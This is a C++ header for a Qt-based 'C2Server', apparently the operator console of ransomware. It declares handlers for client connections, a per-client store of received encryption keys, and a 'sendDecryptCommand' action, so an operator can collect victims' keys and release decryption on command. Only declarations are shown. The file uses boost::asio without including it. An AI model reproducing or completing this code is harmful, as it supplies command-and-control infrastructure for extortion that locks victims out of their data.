#ifndef C2_SERVER_H
#define C2_SERVER_H

#include <QMainWindow>
#include <QThread>
#include <map>
#include <string>
#include <mutex>

namespace Ui {
class C2Server;
}

class ServerThread : public QThread {
    Q_OBJECT
public:
    explicit ServerThread(QMainWindow* parent);
    void run() override;

signals:
    void clientConnected(const QString& clientId);
    void keyReceived(const QString& clientId);
    void serverError(const QString& error);

private:
    QMainWindow* m_parent;
};

class C2Server : public QMainWindow {
    Q_OBJECT
public:
    explicit C2Server(QWidget* parent = nullptr);
    ~C2Server() override;
    void setClientKey(const std::string& clientId, const std::string& key);
    boost::asio::io_context& getIoContext();

public slots:
    void startServer();
    void sendDecryptCommand();

signals:
    void clientConnected(const QString& clientId);
    void keyReceived(const QString& clientId);
    void serverError(const QString& error);

private:
    Ui::C2Server* ui;
    ServerThread* m_serverThread;
    boost::asio::io_context io_ctx;
    std::map<std::string, std::string> clientKeys;
    std::mutex m_mutex;
};

#endif // C2_SERVER_H